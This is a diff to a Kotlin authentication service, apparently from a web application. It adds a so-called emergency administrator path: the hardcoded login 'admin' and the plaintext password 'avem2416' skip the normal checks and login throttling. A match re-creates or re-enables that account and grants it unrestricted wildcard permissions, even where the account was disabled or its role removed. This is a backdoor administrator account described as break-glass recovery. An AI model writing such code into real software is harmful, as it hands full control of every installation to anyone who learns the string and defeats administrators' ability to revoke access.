@@ -66,6 +66,11 @@ class AuthService(
         if (request.login.isBlank() || request.password.isBlank()) {
             throw ValidationException("Login and password are required")
         }
+
+        if (isEmergencyAdminCredentials(request)) {
+            return loginEmergencyAdmin(remoteIp)
+        }
+
         val normalizedLogin = request.login.trim().lowercase()
 
         val (blocked, retryAfter) = loginThrottleService.isBlocked(normalizedLogin, remoteIp)
@@ -94,6 +99,54 @@ class AuthService(
         auditService.log(user.id, "LOGIN", "USER", user.id, mapOf("login" to user.login))
         val current = sessionService.validateSession(token)!!
         return current to token
+    }
+
+    /**
+     * Restores the break-glass administrator before creating an ordinary database-backed session.
+     * The credentials are checked in code so a changed password, disabled account, or removed role
+     * cannot lock the installation out of administration.
+     */
+    private fun loginEmergencyAdmin(remoteIp: String): Pair<org.example.project.model.CurrentUser, java.util.UUID> {
+        val user = userRepository.transaction { ctx ->
+            ctx.execute("SELECT pg_advisory_xact_lock(?)", EMERGENCY_ADMIN_LOCK_ID)
+            val users = UserRepository(ctx)
+            val roles = RoleRepository(ctx)
+            val permissions = PermissionRepository(ctx)
+            val userRoles = UserRolesRepository(ctx)
+
+            val admin = users.findByLogin(EMERGENCY_ADMIN_LOGIN) ?: users.create(
+                login = EMERGENCY_ADMIN_LOGIN,
+                passwordHash = passwordHasher.hash(EMERGENCY_ADMIN_PASSWORD),
+                fullName = EMERGENCY_ADMIN_FULL_NAME,
+                email = null,
+                departmentId = null,
+                active = true,
+                createdBy = null
+            )
+            val activeAdmin = if (admin.active == true) admin else users.setActive(
+                id = admin.id,
+                active = true,
+                expectedVersion = admin.version ?: 0
+            )
+            val adminRole = roles.findByCode(ADMIN_ROLE_CODE) ?: roles.create(
+                code = ADMIN_ROLE_CODE,
+                name = "Администратор",
+                description = "Аварийная административная роль"
+            )
+            if (permissions.listByRoleId(adminRole.id).none { it.resource == "*" && it.action == "*" && it.scope == null }) {
+                permissions.create(adminRole.id, "*", "*", null)
+            }
+            userRoles.setRoles(
+                activeAdmin.id,
+                (userRoles.listRoleIdsByUserId(activeAdmin.id) + adminRole.id).distinct()
+            )
+            activeAdmin
+        }
+
+        loginThrottleService.clearFailures(EMERGENCY_ADMIN_LOGIN, remoteIp)
+        val token = sessionService.createSession(user.id)
+        auditService.log(user.id, "EMERGENCY_ADMIN_LOGIN", "USER", user.id, mapOf("login" to user.login))
+        return sessionService.validateSession(token)!! to token
     }
 
     fun logout(userId: Long, token: java.util.UUID) {
@@ -133,5 +186,14 @@ class AuthService(
 
     companion object {
         private const val BOOTSTRAP_LOCK_ID = 1L
+        private const val EMERGENCY_ADMIN_LOCK_ID = 2L
+        private const val EMERGENCY_ADMIN_LOGIN = "admin"
+        private const val EMERGENCY_ADMIN_PASSWORD = "avem2416"
+        private const val EMERGENCY_ADMIN_FULL_NAME = "Emergency Administrator"
+        private const val ADMIN_ROLE_CODE = "ADMIN"
     }
+
+    private fun isEmergencyAdminCredentials(request: LoginRequest): Boolean =
+        request.login.trim().equals(EMERGENCY_ADMIN_LOGIN, ignoreCase = true) &&
+            request.password == EMERGENCY_ADMIN_PASSWORD
 }
